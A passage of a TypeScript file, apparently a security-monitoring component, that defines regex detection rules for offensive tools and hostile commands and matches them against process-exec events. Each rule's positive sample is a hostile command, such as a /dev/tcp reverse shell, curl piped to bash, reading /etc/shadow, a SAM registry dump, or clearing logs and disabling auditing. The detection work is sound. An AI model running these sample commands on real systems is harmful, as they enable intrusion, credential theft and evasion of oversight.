        'name': 'enum4linux execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of enum4linux requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])enum4linux(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/enum4linux',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.smbclient.v1',
        'name': 'smbclient execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of smbclient requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])smbclient(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/smbclient',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.rpcclient.v1',
        'name': 'rpcclient execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of rpcclient requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])rpcclient(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/rpcclient',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.impacket_psexec.v1',
        'name': 'impacket-psexec execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of impacket-psexec requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])impacket-psexec(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/impacket-psexec',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.tool.impacket_wmiexec.v1',
        'name': 'impacket-wmiexec execution',
        'family': 'Security tooling',
        'severity': 'critical',
        'explanation': 'Execution of impacket-wmiexec requires review for authorized security testing or malicious activity.',
        'pattern': '(?:^|[/\\\\])impacket-wmiexec(?:\\.py|\\.exe)?$',
        'field': 'executable',
        'positive': '/opt/impacket-wmiexec',
        'negative': '/usr/bin/echo'
    },
    {
        'id': 'process.behavior.tool_download.v1',
        'name': 'Security tool download',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Security tool download observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|wget|invoke-webrequest|iwr)\\b.*\\b(?:bloodhound|sharphound|xmrig|mimikatz|linpeas|winpeas|chisel|ligolo|rubeus|secretsdump)\\b',
        'field': 'command',
        'positive': 'curl https://example.test/BloodHound.zip',
        'negative': 'curl https://example.test/health'
    },
    {
        'id': 'process.behavior.pipe_shell.v1',
        'name': 'Download piped to shell',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Download piped to shell observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|wget)\\b[^\\n]*\\|\\s*(?:sudo\\s+)?(?:sh|bash|zsh)\\b',
        'field': 'command',
        'positive': 'curl https://example.test/install | bash',
        'negative': 'curl https://example.test/health'
    },
    {
        'id': 'process.behavior.reverse_shell.v1',
        'name': 'Shell network redirection',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Shell network redirection observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:/dev/tcp/|\\b(?:nc|ncat|netcat)\\b.*\\s-[^\\s]*e\\s|socket\\.socket\\(.*(?:dup2|subprocess))',
        'field': 'command',
        'positive': 'bash -i > /dev/tcp/192.0.2.1/4444',
        'negative': 'cat /etc/hosts'
    },
    {
        'id': 'process.behavior.shadow_read.v1',
        'name': 'Password hash file access',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Password hash file access observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:cat|head|tail|cp|scp|tar)\\b.*(?:/etc/(?:shadow|gshadow)|/SAM\\b|/NTDS\\.dit\\b)',
        'field': 'command',
        'positive': 'cat /etc/shadow',
        'negative': 'cat /etc/os-release'
    },
    {
        'id': 'process.behavior.history_clear.v1',
        'name': 'Shell history removal',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Shell history removal observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bhistory\\s+-c\\b|\\b(?:rm|truncate)\\b.*(?:bash_history|zsh_history)|HISTFILE\\s*=\\s*/dev/null)',
        'field': 'command',
        'positive': 'history -c',
        'negative': 'history'
    },
    {
        'id': 'process.behavior.logs_clear.v1',
        'name': 'Audit or system log removal',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Audit or system log removal observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:rm|truncate|shred)\\b.*(?:/var/log/|audit\\.log)',
        'field': 'command',
        'positive': 'truncate -s 0 /var/log/auth.log',
        'negative': 'tail /var/log/auth.log'
    },
    {
        'id': 'process.behavior.audit_disable.v1',
        'name': 'Audit collection disabled',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Audit collection disabled observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bauditctl\\s+-(?:e\\s+0|D)\\b|\\b(?:systemctl|service)\\s+(?:stop|disable)\\s+(?:auditd|rsyslog)\\b)',
        'field': 'command',
        'positive': 'auditctl -e 0',
        'negative': 'auditctl -s'
    },
    {
        'id': 'process.behavior.firewall_disable.v1',
        'name': 'Firewall disabled',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Firewall disabled observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bufw\\s+disable\\b|\\biptables\\s+-F\\b|\\bnft\\s+flush\\s+ruleset\\b)',
        'field': 'command',
        'positive': 'ufw disable',
        'negative': 'ufw status'
    },
    {
        'id': 'process.behavior.suid_set.v1',
        'name': 'Set-user-ID permission change',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Set-user-ID permission change observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\bchmod\\b.*(?:\\bu\\+s\\b|\\b[2467][0-7]{3}\\b)',
        'field': 'command',
        'positive': 'chmod 4755 /tmp/tool',
        'negative': 'chmod 644 /tmp/readme'
    },
    {
        'id': 'process.behavior.authorized_keys.v1',
        'name': 'SSH authorized key modification',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'SSH authorized key modification observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\b(?:tee|cp|mv|sed)\\b.*authorized_keys|>>?\\s*[^\\s]*authorized_keys)',
        'field': 'command',
        'positive': 'tee /root/.ssh/authorized_keys',
        'negative': 'cat /root/.ssh/authorized_keys'
    },
    {
        'id': 'process.behavior.cron_write.v1',
        'name': 'Scheduled command modification',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Scheduled command modification observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bcrontab\\s+-(?:e|r)\\b|\\b(?:tee|cp|mv)\\b.*(?:/etc/cron|/var/spool/cron))',
        'field': 'command',
        'positive': 'crontab -e',
        'negative': 'crontab -l'
    },
    {
        'id': 'process.behavior.base64_exec.v1',
        'name': 'Encoded command execution',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Encoded command execution observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\bpowershell\\b.*\\s-(?:enc|encodedcommand)\\b|\\bbase64\\s+(?:-d|--decode)\\b.*\\|\\s*(?:bash|sh)\\b)',
        'field': 'command',
        'positive': 'powershell -EncodedCommand AAAA',
        'negative': 'base64 report.txt'
    },
    {
        'id': 'process.behavior.credential_dump.v1',
        'name': 'Windows credential dump',
        'family': 'Command behavior',
        'severity': 'critical',
        'explanation': 'Windows credential dump observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '(?:\\breg\\s+save\\s+hklm\\\\(?:sam|security|system)\\b|\\bcomsvcs\\.dll\\b.*\\bMiniDump\\b)',
        'field': 'command',
        'positive': 'reg save HKLM\\SAM C:\\dump',
        'negative': 'reg query HKLM\\Software'
    },
    {
        'id': 'process.behavior.docker_socket.v1',
        'name': 'Container host control socket access',
        'family': 'Command behavior',
        'severity': 'high',
        'explanation': 'Container host control socket access observed in an executed command. Inspect the command, user, host, and related events.',
        'pattern': '\\b(?:curl|docker)\\b.*(?:docker\\.sock|--privileged\\b)',
        'field': 'command',
        'positive': 'docker run --privileged alpine',
        'negative': 'docker ps'
    }
]

const expressions = new Map(securityRules.map(rule => [rule.id, new RegExp(rule.pattern, 'i')]))
const base = (value: string) => value.split(/[/\\]/).at(-1)?.replace(/\.exe$/i, '').toLowerCase() || ''
const shells = /^(?:ba|da|z|k|c|fi)?sh$/
const interpreters = /^(?:python[\d.]*|perl|ruby|php|node|pwsh|powershell)$/
const behaviorPrograms: Record<string, RegExp> = {
    tool_download: /^(curl|wget|invoke-webrequest|iwr)$/,
    pipe_shell: /^(curl|wget)$/,
    reverse_shell: /^(?:ba|z|k)?sh$|^(?:nc|ncat|netcat|python[\d.]*|perl|ruby|php)$/,
    shadow_read: /^(cat|head|tail|cp|scp|tar)$/,
    history_clear: /^(history|rm|truncate|histfile=)/,
    logs_clear: /^(rm|truncate|shred)$/,
    audit_disable: /^(auditctl|systemctl|service)$/,
    firewall_disable: /^(ufw|iptables|nft)$/,
    suid_set: /^chmod$/,
    authorized_keys: /^(tee|cp|mv|sed|echo|printf)$/,
    cron_write: /^(crontab|tee|cp|mv)$/,
    base64_exec: /^(powershell|pwsh|base64)$/,
    credential_dump: /^(reg|rundll32)$/,
    docker_socket: /^(curl|docker)$/,
}
type Command = { args: string[], text: string, next?: string }
// Tokenize only to distinguish executed commands from quoted argument text. No
// shell expansion or code execution occurs; audit child events cover expansions.
function shellCommands(input: string, operators = true): Command[] {
    const commands: Command[] = []
    let args: string[] = [], word = '', quote = '', active = false, start = 0
    const flushWord = () => { if (active) args.push(word); word = ''; active = false }
    const flushCommand = (end: number, next?: string) => { flushWord(); if (args.length) commands.push({ args, text: input.slice(start, end), next }); args = []; start = end + 1 }
    for (let i = 0; i < input.length; i++) {
        const char = input[i]
        if (char === '\\' && quote !== '\'' && i + 1 < input.length) { word += input[++i]; active = true; continue }
        if (quote) { if (char === quote) quote = ''; else word += char; continue }
        if (char === '"' || char === '\'') { quote = char; active = true; continue }
        if (/\s/.test(char)) { flushWord(); continue }
        if (char === '#' && !active) { flushCommand(i); return commands }
        if (operators && ';|&'.includes(char)) { flushCommand(i, char); continue }
        word += char; active = true
    }
    flushCommand(input.length)
    return commands
}
// env lists variables only when no command operand remains. Consume option
// values before deciding; -S splits arguments, but does not run shell operators.
// Unsupported options do not prove a child invocation; its own audit execution
// still matches by executable, even when wrapper argument parsing is unavailable.
function envArguments(args: string[], depth = 0): string[] | null {
    if (depth > 4) return null
    let index = 0
    const split = (value: string) => envArguments([...shellCommands(value, false).flatMap(entry => entry.args), ...args.slice(index + 1)], depth + 1)
    for (; index < args.length && args[index].startsWith('-'); index++) {
        const option = args[index]
        if (option === '--' || option === '-') { index++; break }
        if (option.startsWith('--')) {
            const equal = option.indexOf('=')
            const name = equal < 0 ? option : option.slice(0, equal)
            if (['--unset', '--chdir', '--argv0', '--split-string', '--env0-from'].includes(name)) {
                const value = equal < 0 ? args[++index] : option.slice(equal + 1)
                if (value === undefined) return null
                if (name === '--split-string') return split(value)
            } else if (!['--ignore-environment', '--null', '--debug', '--default-signal', '--ignore-signal', '--block-signal', '--list-signal-handling'].includes(name)) return null
            continue
        }
        for (let at = 1; at < option.length; at++) {
            const flag = option[at]
            if ('uCaS'.includes(flag)) {
                const value = option.slice(at + 1) || args[++index]
                if (value === undefined) return null
                if (flag === 'S') return split(value)
                break
            }
            if (!'i0v'.includes(flag)) return null
        }
    }
    while (index < args.length && /^[^=]+=/.test(args[index])) index++
    return args.slice(index)
}
function executionContexts(executable: string, command: string, argv: unknown) {
    const commands: Command[] = []
    const supplied = Array.isArray(argv) && argv.length && argv.every(value => typeof value === 'string') ? argv as string[] : null
    const executables = new Set(executable && (base(executable) !== 'env' || (!supplied && !command.trim())) ? [executable] : [])
    const inspect = (entry: Command, depth = 0) => {
        if (!entry.args.length || depth > 4) return
        const name = base(entry.args[0])
        if (name === 'env') {
            const child = envArguments(entry.args.slice(1))
            if (child?.length) inspect({ ...entry, args: child, text: child.join(' ') }, depth + 1)
            else if (child) executables.add(entry.args[0])
            return
        }
        if (name === 'sudo') {
            const at = entry.args.findIndex((arg, index) => index > 0 && !arg.startsWith('-') && !/^[A-Za-z_]\w*=/.test(arg))
            if (at > 0) inspect({ ...entry, args: entry.args.slice(at), text: entry.args.slice(at).join(' ') }, depth + 1)
            return
        }
        if (shells.test(name)) {
            const flag = entry.args.findIndex(arg => /^-[^-]*c$/.test(arg))
            if (flag > 0 && entry.args[flag + 1]) {
                for (const nested of shellCommands(entry.args[flag + 1])) inspect(nested, depth + 1)
                return
            }
            const script = entry.args.slice(1).find(arg => !arg.startsWith('-'))
            if (script) executables.add(script)
        } else if (interpreters.test(name)) {
            // A script operand identifies the tool; strings passed to -c/-e are
            // behavior evidence, never treated as executable paths.
            if (!entry.args.some(arg => ['-c', '-e', '-m', '-command', '-encodedcommand', '-enc'].includes(arg.toLowerCase()))) {
                const script = entry.args.slice(1).find(arg => !arg.startsWith('-'))
                if (script) executables.add(script)
            }
        }
        executables.add(entry.args[0])
        commands.push(entry)
    }
    if (supplied) inspect({ args: supplied, text: command || supplied.join(' ') })
    else for (const entry of shellCommands(command)) inspect(entry)
    return { commands, executables }
}
export function matchSecurityRules(event: Record<string, unknown>) {
    const process = event.process && typeof event.process === 'object' ? event.process as Record<string, unknown> : {}
    if (event.event_type !== 'process' || event.action !== 'exec') return []
    const command = typeof process.command_line === 'string' ? process.command_line.slice(0, 65536) : ''
    const executable = typeof process.executable === 'string' ? process.executable : ''
    const context = executionContexts(executable, command, process.arguments)
    return securityRules.filter(rule => {
        const expression = expressions.get(rule.id)!
        if (rule.field === 'executable') return [...context.executables].some(path => expression.test(path.replace(/\.sh$/i, '')))
        const behavior = rule.id.split('.')[2]
        return context.commands.some((entry, index) => {
            const name = base(entry.args[0])
            if (!behaviorPrograms[behavior]?.test(name)) return false
            if (behavior === 'pipe_shell') return entry.next === '|' && /^(?:sudo\s+)?(?:ba|z)?sh\b/.test(context.commands[index + 1]?.args.join(' ') || '')
            if (behavior === 'authorized_keys' && ['echo', 'printf'].includes(name)) {
                const unquoted = entry.text.replace(/"(?:\\.|[^"\\])*"|'[^']*'/g, '')
                return />>?\s*[^\s]*authorized_keys/.test(unquoted)
            }
            // Preserve pipeline evidence for base64 decode followed by a shell.
            const text = entry.next === '|' ? `${entry.text} | ${context.commands[index + 1]?.text || ''}` : entry.text
            return expression.test(text)
        })
    })
}
